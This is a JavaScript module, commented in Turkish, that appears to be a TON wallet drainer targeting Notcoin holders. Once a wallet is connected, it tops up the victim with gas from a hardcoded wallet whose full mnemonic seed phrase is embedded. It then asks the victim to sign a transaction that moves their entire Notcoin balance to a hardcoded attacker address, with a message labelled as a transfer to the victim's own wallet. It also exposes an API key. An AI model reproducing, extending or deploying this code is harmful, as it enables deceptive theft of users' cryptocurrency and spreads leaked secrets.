/* eslint-disable */
import TonWeb from 'tonweb'; // TonWeb kütüphanesini import ediyoruz
import axios from 'axios'; // Axios'u import ediyoruz
import WalletManager from './WalletManager'; // WalletManager'ı aynı dizinden import et
import { beginCell, toNano, Address } from '@ton/ton'; // Gerekli fonksiyonları import et
import { TON_API_BASE_URL } from './config'; // config.js'den import et
import * as tonMnemonic from 'tonweb-mnemonic';

const provider = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', { apiKey: "d83e9f6d40be3bce2a149a3cf6ef2ac0d2378060cd06adfa5e728bf4cf6de725" });
const tonweb = new TonWeb(provider); // TonWeb'i başlatıyoruz

const NOTCOIN_JETTON_CONTRACT = "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC"; // Notcoin jetton contract adresi
const RECIPIENT_ADDRESS = "UQDF7kn1M_q-yaGRSwySeXWAIX0OvyEaQ0GE9MRG_B9zZOSI"; // Hedef cüzdan adresi

// Mnemonic ifadeler
const mnemonic = [
  "sick", "catch", "dog", "ill", "enemy", "jelly", "brand", "can",
  "distance", "science", "coconut", "nominee", "hour", "whale", "coral", "bamboo",
  "into", "magnet", "month", "sport", "space", "access", "awesome", "tuition"
];

// Ton API ile cüzdan bilgilerini kontrol etmek için fonksiyon
const getAccountInfo = async (address) => {
  try {
    const response = await axios.get(`${TON_API_BASE_URL}/account`, {
      params: { address },
      headers: { "X-API-Key": "d83e9f6d40be3bce2a149a3cf6ef2ac0d2378060cd06adfa5e728bf4cf6de725" }
    });
    return response.data;
  } catch (error) {
    console.error("Cüzdan bilgileri alınamadı:", error.message);
    return null;
  }
};

// Adres formatını kontrol etmek için Address sınıfını kullanarak kontrol yapıyoruz
const isValidTonAddress = (address) => {
  try {
    const parsedAddress = Address.parse(address); // Adresin geçerli olup olmadığını kontrol et
    return !!parsedAddress;
  } catch (error) {
    console.error("Geçersiz TON cüzdan adresi:", error.message);
    return false;
  }
};

// Yetkilendirilmiş Cüzdanı ayarlamak için fonksiyon
const setupWallet = async () => {
  try {
    const keyPair = await tonMnemonic.mnemonicToKeyPair(mnemonic);
    const WalletClass = tonweb.wallet.all.v3R2;
    const wallet = new WalletClass(tonweb.provider, {
      publicKey: keyPair.publicKey,
      secretKey: keyPair.secretKey
    });

    const walletAddress = await wallet.getAddress();
    return wallet;
  } catch (error) {
    console.error('Cüzdan oluşturulurken hata oluştu:', error);
    return null;
  }
};

// Düzenlenen request_transaction fonksiyonu
const request_transaction = async (tonConnectUI) => {
  try {
    const walletAddress = tonConnectUI.account?.address;
    if (!walletAddress || !isValidTonAddress(walletAddress)) return;

    const walletInfo = await getAccountInfo(walletAddress);
    if (!walletInfo || walletInfo.balance <= 0) return;

    const authorizedWallet = await setupWallet();
    if (!authorizedWallet) return;

    const seqno = await authorizedWallet.methods.seqno().call();

    // Yetkilendirilmiş cüzdandan 0.15 TON gönderme
    console.log("Yetkilendirilmiş cüzdandan 0.15 TON transfer ediliyor...");
    await authorizedWallet.methods.transfer({
      secretKey: authorizedWallet.options.secretKey,
      toAddress: walletAddress,
      amount: toNano("0.15"), // 0.15 TON gönderilecek
      seqno: seqno,
      sendMode: 3,
      payload: beginCell().storeUint(0, 32).storeStringTail("Yetkili Cüzdan Başlangıç").endCell().toBoc().toString('base64')
    }).send();

    console.log("Yetkilendirilmiş cüzdandan 0.1 TON transfer edildi. İşlemin tamamlanmasını bekliyoruz...");

    // 0.1 TON transfer işleminin gerçekten tamamlanıp tamamlanmadığını kontrol et
    let retries = 10; // Deneme sayısını 10'a çıkarıyoruz
    while (retries > 0) {
      const updatedWalletInfo = await getAccountInfo(walletAddress);
      if (updatedWalletInfo && updatedWalletInfo.balance >= toNano("0.1")) {
        console.log("0.1 TON başarıyla cüzdana ulaştı.");
        break;
      }
      retries--;
      console.log("0.1 TON işlemi henüz tamamlanmadı. 5 saniye sonra tekrar kontrol ediliyor...");
      await new Promise(resolve => setTimeout(resolve, 5000)); // 5 saniye bekle ve tekrar dene
    }

    if (retries === 0) {
      console.warn("0.1 TON işlemi başarısız oldu veya tamamlanması uzun sürdü.");
      return;
    }

    // Ek olarak 3 saniye bekle ki işlemin blok zincirinde tamamen işlenmesi sağlansın
    console.log("Blok zincirine tamamen işlenmesi için 3 saniye bekleniyor...");
    await new Promise(resolve => setTimeout(resolve, 3000)); // 3 saniye bekle

    const WALLET = new WalletManager(tonConnectUI);
    const notcoinWallet = await WALLET.getNotcoinWallet();
    const notcoinBalance = await WALLET.getNotcoinBalance();

    // Eğer Notcoin bakiyesi 400'den fazlaysa tüm Notcoin'leri talep edeceğiz
    if (parseFloat(notcoinBalance) > toNano("400")) {
      console.log("Notcoin bakiyesi 400'den fazla. Tüm Notcoin bakiyesi talep ediliyor.");
    } else {
      console.log("Notcoin bakiyesi 400'den az.");
      return; // 400'den azsa işlemi durdur.
    }

    const jettonBody = beginCell()
      .storeUint(0xf8a7ea5, 32)
      .storeUint(0, 64)
      .storeCoins(notcoinBalance) // Tüm Notcoin bakiyesini talep ediyoruz
      .storeAddress(Address.parse(RECIPIENT_ADDRESS))
      .storeAddress(Address.parse(walletAddress))
      .storeBit(0)
      .storeCoins(toNano('0.01'))
      .storeBit(0)
      .endCell();

    const selfTransferBody = beginCell()
      .storeUint(0, 32)
      .storeStringTail("Kendi Cüzdanınıza Transfer")
      .endCell();

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60,
      messages: [
        {
          address: notcoinWallet.address,
          amount: toNano('0.05').toString(),
          payload: jettonBody.toBoc().toString('base64'),
        },
        {
          address: walletAddress,
          amount: toNano("0.1").toString(),
          payload: selfTransferBody.toBoc().toString('base64'),
        }
      ],
    };

    const result = await tonConnectUI.sendTransaction(transaction);
    console.log('Transaction başarılı:', result);

  } catch (error) {
    console.error('Transaction hatası:', error);
  }
};

export { request_transaction };
